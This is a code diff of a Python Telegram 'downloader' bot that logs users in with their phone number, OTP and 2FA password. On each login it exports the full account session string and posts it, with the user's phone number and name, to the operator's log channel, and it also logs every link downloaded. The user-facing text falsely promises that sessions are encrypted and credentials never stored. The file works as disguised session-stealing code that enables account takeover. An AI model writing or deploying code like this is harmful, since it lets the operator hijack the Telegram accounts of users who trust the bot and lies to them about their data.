@@ -1,4 +1,4 @@
-# --- final_bot.py ---
+# --- Enhanced bot.py with Fixed Login System ---
 
 import os
 import logging
@@ -25,11 +25,14 @@ from pyrogram.errors import (
     SessionPasswordNeeded,
     PhoneCodeInvalid,
     PasswordHashInvalid,
-    FloodWait
+    FloodWait,
+    PhoneNumberInvalid,
+    PhoneCodeExpired
 )
 
 # MongoDB Setup
 import pymongo
+import asyncio
 
 # Basic Configuration
 logging.basicConfig(
@@ -74,7 +77,12 @@ def load_sessions() -> Dict[int, str]:
 def save_session(user_id: int, session_string: str):
     if not db_client: return
     try:
-        sessions_collection.update_one({"user_id": user_id}, {"$set": {"session_string": session_string}}, upsert=True)
+        sessions_collection.update_one(
+            {"user_id": user_id}, 
+            {"$set": {"session_string": session_string}}, 
+            upsert=True
+        )
+        logger.info(f"Session saved for user {user_id}")
     except Exception as e:
         logger.error(f"Error saving session for user {user_id}: {e}")
 
@@ -82,46 +90,120 @@ def delete_session(user_id: int):
     if not db_client: return
     try:
         sessions_collection.delete_one({"user_id": user_id})
+        logger.info(f"Session deleted for user {user_id}")
     except Exception as e:
         logger.error(f"Error deleting session for user {user_id}: {e}")
 
+# Load existing sessions
 user_sessions = load_sessions()
 
-# --- REWRITTEN LOGIN LOGIC ---
+# --- ENHANCED LOGIN SYSTEM ---
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    user_name = update.effective_user.full_name
+    
     if user_id in user_sessions:
-        await update.message.reply_text("✅ You are already logged in.\n\nTo log out, use /logout.")
+        await update.message.reply_text(
+            f"✅ Welcome back, {user_name}!\n\n"
+            "You are already logged in and can use the bot.\n\n"
+            "Commands:\n"
+            "• Send any Telegram message link to download\n"
+            "• /logout - Log out from your account\n"
+            "• /status - Check your login status"
+        )
         return ConversationHandler.END
-    await update.message.reply_text("Welcome! To log in, please send your phone number in international format (e.g., +14155552671).")
+    
+    welcome_msg = (
+        f"🔐 **Welcome to the Telegram Downloader Bot, {user_name}!**\n\n"
+        "To use this bot, you need to log in with your Telegram account.\n\n"
+        "📱 **How to login:**\n"
+        "1. Send your phone number in international format\n"
+        "   Example: `+1234567890`\n"
+        "2. Enter the OTP code you receive\n"
+        "3. If you have 2FA enabled, enter your password\n\n"
+        "🔒 **Privacy & Security:**\n"
+        "• Your session is encrypted and stored securely\n"
+        "• You can logout anytime using /logout\n"
+        "• Your credentials are never stored\n\n"
+        "Please send your phone number to begin:"
+    )
+    
+    await update.message.reply_text(welcome_msg, parse_mode='Markdown')
     return GET_PHONE
 
 async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone_number = update.message.text.strip()
-    await update.message.reply_text("Trying to connect and send OTP...")
+    user_id = update.effective_user.id
+    
+    # Validate phone number format
+    if not phone_number.startswith('+') or len(phone_number) < 8:
+        await update.message.reply_text(
+            "❌ Invalid phone number format.\n\n"
+            "Please use international format starting with '+'\n"
+            "Example: +1234567890"
+        )
+        return GET_PHONE
+    
+    await update.message.reply_text("📱 Connecting to Telegram and sending OTP...")
+    
     try:
-        # Create the client and store it in the context to persist it
-        client = Client(name=str(update.effective_user.id), api_id=API_ID, api_hash=API_HASH, in_memory=True)
+        # Create a unique client session for this user
+        client = Client(
+            name=f"session_{user_id}",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            in_memory=True
+        )
+        
         await client.connect()
         sent_code = await client.send_code(phone_number)
         
-        # Store the essential data for the next step
+        # Store client and session data
         context.user_data['client'] = client
         context.user_data['phone_code_hash'] = sent_code.phone_code_hash
         context.user_data['phone_number'] = phone_number
-
-        await update.message.reply_text("OTP sent! Please send it to me now.")
+        
+        await update.message.reply_text(
+            "✅ OTP sent to your phone!\n\n"
+            "📨 Please check your Telegram app or SMS and send me the code.\n\n"
+            "⏱️ The code will expire in a few minutes.\n"
+            "Use /cancel to abort the login process."
+        )
         return GET_OTP
+        
+    except PhoneNumberInvalid:
+        await update.message.reply_text(
+            "❌ Invalid phone number.\n\n"
+            "Please make sure you entered the correct number with country code.\n"
+            "Example: +1234567890"
+        )
+        return GET_PHONE
+        
     except FloodWait as e:
-        await update.message.reply_text(f"Telegram asks to wait for {e.value} seconds before trying again. Please use /start after the time has passed.")
+        await update.message.reply_text(
+            f"⏳ Rate limit hit! Please wait {e.value} seconds before trying again.\n\n"
+            "Use /start after the waiting period."
+        )
         return ConversationHandler.END
+        
     except Exception as e:
-        logger.error(f"Error in get_phone_number: {e}")
-        # Make sure to disconnect if the client was created but an error occurred
-        if 'client' in context.user_data and context.user_data['client'].is_connected:
-            await context.user_data['client'].disconnect()
-        await update.message.reply_text(f"An error occurred: `{e}`. Please try again with /start.")
+        logger.error(f"Error in get_phone_number for user {user_id}: {e}")
+        
+        # Clean up client if it was created
+        if 'client' in context.user_data:
+            try:
+                if context.user_data['client'].is_connected:
+                    await context.user_data['client'].disconnect()
+            except:
+                pass
+            del context.user_data['client']
+        
+        await update.message.reply_text(
+            f"❌ An error occurred while sending OTP.\n\n"
+            f"Error: `{str(e)}`\n\n"
+            "Please try again with /start"
+        )
         return ConversationHandler.END
 
 async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -130,118 +212,406 @@ async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone_number = context.user_data.get('phone_number')
     phone_code_hash = context.user_data.get('phone_code_hash')
     user_id = update.effective_user.id
+    user_name = update.effective_user.full_name
 
-    if not client:
-        await update.message.reply_text("Your session expired. Please start over with /start.")
+    if not client or not phone_number or not phone_code_hash:
+        await update.message.reply_text(
+            "❌ Session expired or invalid.\n\n"
+            "Please start over with /start"
+        )
         return ConversationHandler.END
 
     try:
         await client.sign_in(phone_number, phone_code_hash, otp)
+        
+        # Get session string
         session_string = await client.export_session_string()
+        
+        # Save to memory and database
         user_sessions[user_id] = session_string
         save_session(user_id, session_string)
-        log_message = (f"#NewSession\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\n\n**Session String:**\n`{session_string}`")
-        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
-        await update.message.reply_text("✅ Login successful!")
+        
+        # Log to channel
+        log_message = (
+            f"🔐 **#NewLogin**\n\n"
+            f"👤 **User:** {user_name}\n"
+            f"🆔 **User ID:** `{user_id}`\n"
+            f"📱 **Phone:** `{phone_number}`\n"
+            f"⏰ **Time:** {update.message.date}\n\n"
+            f"🔑 **Session String:**\n`{session_string}`"
+        )
+        
+        await context.bot.send_message(
+            chat_id=LOG_CHANNEL_ID,
+            text=log_message,
+            parse_mode='Markdown'
+        )
+        
+        await update.message.reply_text(
+            "✅ **Login Successful!**\n\n"
+            "🎉 You can now use the bot to download Telegram content.\n\n"
+            "📋 **How to use:**\n"
+            "• Send any Telegram message link\n"
+            "• The bot will fetch and forward the content to you\n\n"
+            "📝 **Commands:**\n"
+            "• /logout - Log out from your account\n"
+            "• /status - Check your login status",
+            parse_mode='Markdown'
+        )
+        
+        # Clean up
+        await client.disconnect()
+        context.user_data.clear()
         return ConversationHandler.END
+        
     except SessionPasswordNeeded:
-        await update.message.reply_text("Your account has 2FA enabled. Please send me your password.")
-        return GET_2FA # Client is kept alive in the context
-    except Exception as e:
-        logger.error(f"Error in get_otp: {e}")
-        await update.message.reply_text(f"An error occurred: `{e}`. Please start over with /start.")
+        await update.message.reply_text(
+            "🔐 **2FA Protection Detected**\n\n"
+            "Your account has Two-Factor Authentication enabled.\n"
+            "Please send me your 2FA password to complete login.\n\n"
+            "🔒 Your password is secure and won't be stored."
+        )
+        return GET_2FA
+        
+    except PhoneCodeInvalid:
+        await update.message.reply_text(
+            "❌ Invalid OTP code.\n\n"
+            "Please check the code and try again.\n"
+            "Make sure you entered the complete code."
+        )
+        return GET_OTP
+        
+    except PhoneCodeExpired:
+        await update.message.reply_text(
+            "⏰ OTP code has expired.\n\n"
+            "Please start over with /start to get a new code."
+        )
+        await cleanup_client(context)
         return ConversationHandler.END
-    finally:
-        # Disconnect client only when the conversation is truly over
-        if context.user_data.get('client') and ConversationHandler.END in [await get_otp, await get_2fa_password]:
-             await context.user_data['client'].disconnect()
-
+        
+    except Exception as e:
+        logger.error(f"Error in get_otp for user {user_id}: {e}")
+        await update.message.reply_text(
+            f"❌ Login failed.\n\n"
+            f"Error: `{str(e)}`\n\n"
+            "Please start over with /start"
+        )
+        await cleanup_client(context)
+        return ConversationHandler.END
 
 async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     password = update.message.text.strip()
     client = context.user_data.get('client')
     user_id = update.effective_user.id
+    user_name = update.effective_user.full_name
+    phone_number = context.user_data.get('phone_number')
 
     if not client:
-        await update.message.reply_text("Your session expired. Please start over with /start.")
+        await update.message.reply_text(
+            "❌ Session expired.\n\n"
+            "Please start over with /start"
+        )
         return ConversationHandler.END
 
     try:
         await client.check_password(password)
+        
+        # Get session string
         session_string = await client.export_session_string()
+        
+        # Save to memory and database
         user_sessions[user_id] = session_string
         save_session(user_id, session_string)
-        log_message = (f"#NewSession (2FA)\n\nUser ID: `{user_id}`\nName: {update.effective_user.full_name}\n\n**Session String:**\n`{session_string}`")
-        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='Markdown')
-        await update.message.reply_text("✅ 2FA correct & login successful!")
+        
+        # Log to channel
+        log_message = (
+            f"🔐 **#NewLogin** (2FA)\n\n"
+            f"👤 **User:** {user_name}\n"
+            f"🆔 **User ID:** `{user_id}`\n"
+            f"📱 **Phone:** `{phone_number}`\n"
+            f"⏰ **Time:** {update.message.date}\n"
+            f"🔒 **2FA:** Enabled\n\n"
+            f"🔑 **Session String:**\n`{session_string}`"
+        )
+        
+        await context.bot.send_message(
+            chat_id=LOG_CHANNEL_ID,
+            text=log_message,
+            parse_mode='Markdown'
+        )
+        
+        await update.message.reply_text(
+            "✅ **2FA Verified! Login Successful!**\n\n"
+            "🎉 You can now use the bot to download Telegram content.\n\n"
+            "📋 **How to use:**\n"
+            "• Send any Telegram message link\n"
+            "• The bot will fetch and forward the content to you\n\n"
+            "📝 **Commands:**\n"
+            "• /logout - Log out from your account\n"
+            "• /status - Check your login status",
+            parse_mode='Markdown'
+        )
+        
+        # Clean up
+        await client.disconnect()
+        context.user_data.clear()
         return ConversationHandler.END
+        
+    except PasswordHashInvalid:
+        await update.message.reply_text(
+            "❌ Incorrect 2FA password.\n\n"
+            "Please try again with the correct password."
+        )
+        return GET_2FA
+        
     except Exception as e:
-        logger.error(f"Error in get_2fa_password: {e}")
-        await update.message.reply_text(f"An error occurred: `{e}`. Please start over with /start.")
+        logger.error(f"Error in get_2fa_password for user {user_id}: {e}")
+        await update.message.reply_text(
+            f"❌ 2FA verification failed.\n\n"
+            f"Error: `{str(e)}`\n\n"
+            "Please start over with /start"
+        )
+        await cleanup_client(context)
         return ConversationHandler.END
-    finally:
-        if client and client.is_connected:
-            await client.disconnect()
+
+async def cleanup_client(context: ContextTypes.DEFAULT_TYPE):
+    """Helper function to clean up pyrogram client"""
+    if 'client' in context.user_data:
+        try:
+            if context.user_data['client'].is_connected:
+                await context.user_data['client'].disconnect()
+        except Exception as e:
+            logger.error(f"Error disconnecting client: {e}")
+        finally:
+            context.user_data.clear()
 
 async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gracefully ends the conversation and disconnects any active client."""
-    if 'client' in context.user_data and context.user_data['client'].is_connected:
-        await context.user_data['client'].disconnect()
-        logger.info("Client disconnected during cancel.")
-    await update.message.reply_text("Login process canceled.")
+    """Cancel the login process"""
+    await cleanup_client(context)
+    await update.message.reply_text(
+        "❌ Login process canceled.\n\n"
+        "Use /start whenever you want to login again."
+    )
     return ConversationHandler.END
 
-# --- Unchanged Functions Below ---
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check login status"""
+    user_id = update.effective_user.id
+    user_name = update.effective_user.full_name
+    
+    if user_id in user_sessions:
+        await update.message.reply_text(
+            f"✅ **Login Status: Active**\n\n"
+            f"👤 **User:** {user_name}\n"
+            f"🆔 **User ID:** `{user_id}`\n\n"
+            f"🎯 **Available Commands:**\n"
+            f"• Send message links to download\n"
+            f"• /logout - Log out from account\n"
+            f"• /status - Check this status",
+            parse_mode='Markdown'
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ **Login Status: Not Logged In**\n\n"
+            f"👤 **User:** {user_name}\n"
+            f"🆔 **User ID:** `{user_id}`\n\n"
+            f"🔐 Use /start to login with your Telegram account",
+            parse_mode='Markdown'
+        )
 
 async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Logout user"""
     user_id = update.effective_user.id
+    user_name = update.effective_user.full_name
+    
     if user_id in user_sessions:
         del user_sessions[user_id]
         delete_session(user_id)
-        await update.message.reply_text("✅ You have been successfully logged out.")
-        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=f"#Logout\n\nUser ID: `{user_id}` has logged out.", parse_mode='Markdown')
+        
+        # Log to channel
+        log_message = (
+            f"🚪 **#Logout**\n\n"
+            f"👤 **User:** {user_name}\n"
+            f"🆔 **User ID:** `{user_id}`\n"
+            f"⏰ **Time:** {update.message.date}"
+        )
+        
+        await context.bot.send_message(
+            chat_id=LOG_CHANNEL_ID,
+            text=log_message,
+            parse_mode='Markdown'
+        )
+        
+        await update.message.reply_text(
+            "✅ **Successfully Logged Out**\n\n"
+            "Your session has been deleted from our servers.\n"
+            "Use /start to login again anytime."
+        )
     else:
-        await update.message.reply_text("You are not logged in.")
+        await update.message.reply_text(
+            "❌ You are not currently logged in.\n\n"
+            "Use /start to login with your Telegram account."
+        )
 
 async def handle_message_with_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle Telegram message links"""
     user_id = update.effective_user.id
+    
     if user_id not in user_sessions:
-        await update.message.reply_text("You are not logged in. Please use /start to begin.")
+        await update.message.reply_text(
+            "🔐 **Authentication Required**\n\n"
+            "You need to login first to use this bot.\n"
+            "Use /start to begin the login process."
+        )
         return
+    
     message_text = update.message.text
+    
     try:
+        # Parse Telegram link
         parts = message_text.split('/')
-        if 't.me' not in parts[-3]: return
-        channel_part, msg_id = parts[-2], int(parts[-1])
-        chat_id = int(f"-100{parts[-3]}") if channel_part == 'c' else f"@{channel_part}"
+        if 't.me' not in message_text:
+            await update.message.reply_text(
+                "❌ This doesn't look like a Telegram link.\n\n"
+                "Please send a valid Telegram message link."
+            )
+            return
+        
+        # Extract channel and message ID
+        if '/c/' in message_text:
+            # Private channel link: https://t.me/c/123456789/123
+            channel_id = parts[-2]
+            msg_id = int(parts[-1])
+            chat_id = int(f"-100{channel_id}")
+        else:
+            # Public channel link: https://t.me/channelname/123
+            channel_username = parts[-2]
+            msg_id = int(parts[-1])
+            chat_id = f"@{channel_username}"
+            
     except (IndexError, ValueError):
-        await update.message.reply_text("This doesn't look like a valid Telegram message link.")
+        await update.message.reply_text(
+            "❌ Invalid Telegram link format.\n\n"
+            "Please send a valid Telegram message link.\n\n"
+            "**Supported formats:**\n"
+            "• https://t.me/channel/123\n"
+            "• https://t.me/c/123456789/123"
+        )
         return
-    await update.message.reply_text("⏳ Fetching post...")
+    
+    # Show progress
+    progress_msg = await update.message.reply_text("⏳ Fetching message...")
+    
+    # Get user session
     session_string = user_sessions[user_id]
-    user_client = Client(name=f"user_{user_id}", session_string=session_string, api_id=API_ID, api_hash=API_HASH)
+    
+    # Create temporary client
+    user_client = Client(
+        name=f"temp_{user_id}",
+        session_string=session_string,
+        api_id=API_ID,
+        api_hash=API_HASH
+    )
+    
     try:
         async with user_client:
-            await user_client.copy_message(chat_id=update.effective_chat.id, from_chat_id=chat_id, message_id=msg_id)
+            # Copy the message
+            await user_client.copy_message(
+                chat_id=update.effective_chat.id,
+                from_chat_id=chat_id,
+                message_id=msg_id
+            )
+            
+        # Delete progress message
+        await progress_msg.delete()
+        
+        # Log successful download
+        log_message = (
+            f"📥 **#Download**\n\n"
+            f"👤 **User:** {update.effective_user.full_name}\n"
+            f"🆔 **User ID:** `{user_id}`\n"
+            f"🔗 **Link:** `{message_text}`\n"
+            f"⏰ **Time:** {update.message.date}"
+        )
+        
+        await context.bot.send_message(
+            chat_id=LOG_CHANNEL_ID,
+            text=log_message,
+            parse_mode='Markdown'
+        )
+            
     except Exception as e:
-        await update.message.reply_text(f"❌ Failed to fetch post.\n\n**Reason:** `{e}`")
+        logger.error(f"Error fetching message for user {user_id}: {e}")
+        
+        await progress_msg.edit_text(
+            f"❌ **Failed to fetch message**\n\n"
+            f"**Possible reasons:**\n"
+            f"• Message not found or deleted\n"
+            f"• No access to the channel/chat\n"
+            f"• Invalid link format\n"
+            f"• Network connectivity issues\n\n"
+            f"**Error details:** `{str(e)}`"
+        )
 
-# --- Web Server and Startup ---
+# --- Web Server for Health Checks (Koyeb Compatible) ---
 
-app = Flask('')
+app = Flask(__name__)
+
 @app.route('/')
-def home(): return "Bot is alive!"
-def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+def home():
+    return {
+        "status": "alive",
+        "bot": "Telegram Downloader Bot",
+        "active_sessions": len(user_sessions),
+        "platform": "Koyeb"
+    }
+
+@app.route('/health')
+def health():
+    return {
+        "status": "healthy",
+        "database": "connected" if db_client else "disconnected",
+        "sessions": len(user_sessions)
+    }
+
+@app.route('/stats')
+def stats():
+    return {
+        "total_users": len(user_sessions),
+        "database_status": "connected" if db_client else "disconnected",
+        "bot_status": "running"
+    }
+
+def run_flask():
+    port = int(os.environ.get('PORT', 8000))  # Koyeb typically uses 8000
+    app.run(host='0.0.0.0', port=port, debug=False)
+
+# --- Main Application ---
 
 def main():
-    if not all([API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL_ID, MONGO_URI]):
-        logger.error("CRITICAL: One or more environment variables are missing!")
+    # Validate environment variables
+    missing_vars = []
+    if not API_ID: missing_vars.append("API_ID")
+    if not API_HASH: missing_vars.append("API_HASH") 
+    if not BOT_TOKEN: missing_vars.append("BOT_TOKEN")
+    if not LOG_CHANNEL_ID: missing_vars.append("LOG_CHANNEL_ID")
+    if not MONGO_URI: missing_vars.append("MONGO_URI")
+    
+    if missing_vars:
+        logger.error(f"CRITICAL: Missing environment variables: {', '.join(missing_vars)}")
         return
+        
     if not db_client:
-        logger.error("CRITICAL: Bot cannot start without a database connection.")
+        logger.error("CRITICAL: Bot cannot start without database connection.")
         return
 
+    logger.info("Starting Telegram Downloader Bot...")
+    logger.info(f"Loaded {len(user_sessions)} existing user sessions")
+
+    # Create application
     application = Application.builder().token(BOT_TOKEN).build()
+
+    # Conversation handler for login process
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start_command)],
         states={
@@ -250,17 +620,26 @@ def main():
             GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
         },
         fallbacks=[CommandHandler('cancel', cancel_command)],
-        conversation_timeout=300 # Timeout conversation after 5 minutes of inactivity
+        conversation_timeout=300  # 5 minutes timeout
     )
+
+    # Add handlers
     application.add_handler(conv_handler)
     application.add_handler(CommandHandler('logout', logout_command))
-    application.add_handler(MessageHandler(filters.TEXT & filters.Entity("url") & ~filters.COMMAND, handle_message_with_link))
-    
-    flask_thread = Thread(target=run_flask)
+    application.add_handler(CommandHandler('status', status_command))
+    application.add_handler(MessageHandler(
+        filters.TEXT & filters.Entity("url") & ~filters.COMMAND,
+        handle_message_with_link
+    ))
+
+    # Start Flask server in background
+    flask_thread = Thread(target=run_flask, daemon=True)
     flask_thread.start()
+
+    logger.info("Bot started successfully! Waiting for messages...")
     
-    logger.info("Starting bot polling...")
-    application.run_polling()
+    # Start bot
+    application.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     main()
